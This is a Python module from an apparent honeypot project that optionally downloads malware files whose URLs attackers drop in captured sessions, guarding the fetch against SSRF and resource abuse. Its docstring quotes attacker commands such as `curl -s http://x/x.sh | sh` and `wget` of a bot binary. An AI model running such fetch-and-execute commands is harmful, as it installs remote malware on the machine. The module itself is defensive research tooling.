"""Opt-in retrieval of the payloads attackers tell us about.

The premise of this project is farming malware, and most sessions hand us a
*reference* to the malware rather than the malware itself: a telnet loader
runs `wget http://185.x.x.x/bins/arm7`, a webshell probe posts
`curl -s http://x/x.sh | sh`. `ioc.py` already extracts those URLs. This
module optionally goes and gets the file, so the sample store ends up with
the actual binary instead of a pointer to one that will be offline in six
hours.

This is deliberately off by default, because it is the only part of
honeyknot that makes an outbound connection, and that changes the
deployment's risk profile in three concrete ways:

  * **Attribution.** Fetching announces "something at this IP parsed my
    payload". A sophisticated operator watching their own logs learns the
    host is a honeypot and stops feeding it. If your goal is long-lived
    passive collection, leave this off.
  * **SSRF into your own network.** The URL is attacker-controlled. If the
    honeypot can route to internal services, a crafted URL turns it into a
    request forwarder. Mitigated here by resolving the host, rejecting
    private/loopback/link-local/reserved destinations, and re-checking the
    *actual* connected peer address after the socket is up so a DNS
    rebinding between check and connect still fails closed. Override only
    for lab work with `allow_private`.
  * **You are downloading live malware.** Bytes land in `logs/samples/`
    like any other capture. They are never executed, but the store now
    holds real payloads — treat the directory accordingly.

Bounded by construction: a fixed byte ceiling per fetch, a socket timeout,
a concurrency cap, a total-fetch budget for the process lifetime, and a
seen-URL set so a botnet hammering the same dropper for a week costs one
request.
"""

from __future__ import annotations

import asyncio
import contextlib
import http.client
import ipaddress
import logging
import socket
import ssl
import time
import urllib.parse

logger = logging.getLogger("honeyknot.fetcher")

DEFAULT_MAX_BYTES = 8 * 1024 * 1024
DEFAULT_TIMEOUT = 15.0
DEFAULT_MAX_CONCURRENT = 4
DEFAULT_MAX_TOTAL = 5000
DEFAULT_MAX_REDIRECTS = 3
MAX_SEEN_URLS = 50_000
SUPPORTED_SCHEMES = ("http", "https")

# Match the tool the attacker themselves invoked: a C2 that filters on
# User-Agent usually allows the busybox/wget strings its own loader sends.
DEFAULT_USER_AGENT = "Wget/1.20.3 (linux-gnu)"


class PayloadFetcher:
    """Downloads URLs seen in captures and feeds them back into the pipeline.

    `on_payload(data, url, peer, port, protocol)` is the hook back into
    `server._finalize_payload`, so a fetched binary gets hashed, stored,
    magic-byte analyzed, IOC-extracted, YARA-scanned, and exploit-classified
    exactly like a session capture. It returns the digest.
    """

    def __init__(self, *, enabled: bool = False,
                 events=None,
                 on_payload=None,
                 max_bytes: int = DEFAULT_MAX_BYTES,
                 timeout: float = DEFAULT_TIMEOUT,
                 allow_private: bool = False,
                 max_concurrent: int = DEFAULT_MAX_CONCURRENT,
                 max_total: int = DEFAULT_MAX_TOTAL,
                 user_agent: str = DEFAULT_USER_AGENT):
        self.enabled = enabled
        self.events = events
        self.on_payload = on_payload
        self.max_bytes = max_bytes
        self.timeout = timeout
        self.allow_private = allow_private
        self.max_total = max_total
        self.user_agent = user_agent
        self._sem = asyncio.Semaphore(max_concurrent)
        self._seen: set[str] = set()
        self._fetched = 0
        self._tasks: set[asyncio.Task] = set()

    # -- scheduling --------------------------------------------------------

    def schedule(self, urls, *, peer: tuple, port: int, protocol: str) -> int:
        """Queue fetches for `urls`. Returns how many were actually queued.

        Fire-and-forget: capture finalization must never block on a remote
        server. Tasks are tracked so shutdown can cancel them.
        """
        if not self.enabled or not urls or self.on_payload is None:
            return 0
        queued = 0
        for url in urls:
            if not self._should_fetch(url):
                continue
            self._seen.add(url)
            task = asyncio.ensure_future(
                self._fetch_and_store(url, peer, port, protocol))
            self._tasks.add(task)
            task.add_done_callback(self._tasks.discard)
            queued += 1
        return queued

    def _should_fetch(self, url: str) -> bool:
        if not isinstance(url, str) or url in self._seen:
            return False
        if self._fetched >= self.max_total:
            return False
        if len(self._seen) >= MAX_SEEN_URLS:
            # Cheaper than an LRU and the practical effect is the same: once
            # we've seen this many distinct droppers, stop growing the set.
            return False
        scheme = url.split("://", 1)[0].lower()
        return scheme in SUPPORTED_SCHEMES

    async def close(self) -> None:
        """Cancel any in-flight fetches (called on daemon shutdown)."""
        for task in list(self._tasks):
            task.cancel()
        if self._tasks:
            await asyncio.gather(*self._tasks, return_exceptions=True)

    # -- the fetch itself --------------------------------------------------

    async def _fetch_and_store(self, url: str, peer: tuple, port: int,
                               protocol: str) -> None:
        async with self._sem:
            self._fetched += 1
            started = time.monotonic()
            try:
                status, data, content_type, error = await asyncio.to_thread(
                    self._blocking_fetch, url)
            except Exception as e:  # never let a fetch kill the loop
                status, data, content_type, error = None, b"", None, repr(e)
            elapsed_ms = int((time.monotonic() - started) * 1000)

        digest = None
        if data and self.on_payload is not None:
            with contextlib.suppress(Exception):
                digest = self.on_payload(
                    data=data, url=url, peer=peer, port=port, protocol=protocol)

        if error:
            logger.info("payload fetch failed %s: %s", url, error)
        else:
            logger.info("payload fetch %s -> %s (%d bytes, sha256=%s)",
                        url, status, len(data), digest)

        if self.events is not None:
            self.events.emit(
                "payload_fetch", transport="-", port=port, protocol=protocol,
                peer=peer, url=url, status=status, bytes=len(data),
                sha256=digest, content_type=content_type, error=error,
                elapsed_ms=elapsed_ms,
            )

    def _blocking_fetch(self, url: str, depth: int = 0):
        """Synchronous fetch, run on a worker thread.

        Returns `(status, body, content_type, error)`. Redirects are followed
        manually (bounded) so every hop gets the same destination vetting as
        the first.
        """
        parts = urllib.parse.urlsplit(url)
        if parts.scheme not in SUPPORTED_SCHEMES or not parts.hostname:
            return None, b"", None, f"unsupported url: {url[:120]}"

        host = parts.hostname
        default_port = 443 if parts.scheme == "https" else 80
        try:
            dest_port = parts.port or default_port
        except ValueError:
            return None, b"", None, "invalid port"

        blocked = self._vet_host(host)
        if blocked is not None:
            return None, b"", None, blocked

        path = urllib.parse.urlunsplit(("", "", parts.path or "/",
                                        parts.query, ""))
        conn = None
        try:
            if parts.scheme == "https":
                # Malware C2 certificates are self-signed, expired, or for a
                # different name essentially always. We want the bytes, not a
                # trust decision, so verification is off by design.
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                conn = http.client.HTTPSConnection(
                    host, dest_port, timeout=self.timeout, context=ctx)
            else:
                conn = http.client.HTTPConnection(
                    host, dest_port, timeout=self.timeout)
            conn.connect()

            # Re-check after connect: this is what closes the DNS-rebinding
            # window between resolution and the socket actually being open.
            blocked = self._vet_sock(conn.sock)
            if blocked is not None:
                return None, b"", None, blocked

            conn.putrequest("GET", path, skip_accept_encoding=True)
            conn.putheader("Host", parts.netloc)
            conn.putheader("User-Agent", self.user_agent)
            conn.putheader("Accept", "*/*")
            conn.putheader("Connection", "close")
            conn.endheaders()

            resp = conn.getresponse()
            status = resp.status
            content_type = resp.getheader("Content-Type")

            if status in (301, 302, 303, 307, 308) and depth < DEFAULT_MAX_REDIRECTS:
                location = resp.getheader("Location")
                if location:
                    nxt = urllib.parse.urljoin(url, location)
                    resp.close()
                    conn.close()
                    return self._blocking_fetch(nxt, depth + 1)

            body = resp.read(self.max_bytes + 1)
            truncated = len(body) > self.max_bytes
            if truncated:
                body = body[:self.max_bytes]
            error = "truncated at max_bytes" if truncated else None
            return status, body, content_type, error
        except (OSError, http.client.HTTPException, ssl.SSLError,
                ValueError) as e:
            return None, b"", None, repr(e)
        finally:
            if conn is not None:
                with contextlib.suppress(Exception):
                    conn.close()

    # -- destination vetting ----------------------------------------------

    def _vet_host(self, host: str) -> str | None:
        """Return a rejection reason, or None if the host is fetchable."""
        if self.allow_private:
            return None
        try:
            infos = socket.getaddrinfo(host, None, proto=socket.IPPROTO_TCP)
        except socket.gaierror as e:
            return f"dns failure: {e}"
        if not infos:
            return "dns returned no addresses"
        for info in infos:
            addr = info[4][0]
            reason = _reject_address(addr)
            if reason is not None:
                # One bad address is enough: a hostname resolving to both a
                # public and a private address is a rebinding setup.
                return reason
        return None

    def _vet_sock(self, sock) -> str | None:
        if self.allow_private or sock is None:
            return None
        try:
            peer = sock.getpeername()
        except OSError:
            return "cannot read peer address"
        return _reject_address(peer[0]) if peer else None


def _reject_address(addr: str) -> str | None:
    """Reject anything that isn't a routable public address."""
    try:
        ip = ipaddress.ip_address(addr.split("%", 1)[0])
    except ValueError:
        return f"unparseable address: {addr[:60]}"
    if (ip.is_private or ip.is_loopback or ip.is_link_local
            or ip.is_reserved or ip.is_multicast or ip.is_unspecified):
        return f"refusing non-public destination {ip}"
    return None
